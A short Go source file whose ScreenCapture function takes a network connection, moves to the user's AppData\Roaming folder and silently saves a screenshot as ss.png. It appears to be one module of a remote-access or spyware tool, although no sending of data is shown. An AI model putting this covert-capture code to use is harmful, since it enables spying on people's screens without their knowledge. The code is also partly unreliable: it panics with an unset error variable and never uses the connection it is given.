package snap

import (
	"image/png"
	"net"
	"os"
	"path/filepath"

	"github.com/vova616/screenshot"
)

func ScreenCapture(connection net.Conn) (err error) {

	home, _ := os.UserHomeDir()
	com := os.Chdir(filepath.Join(home, "AppData\\Roaming"))
	if com != nil {
		panic(err)
	}
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
	return

}
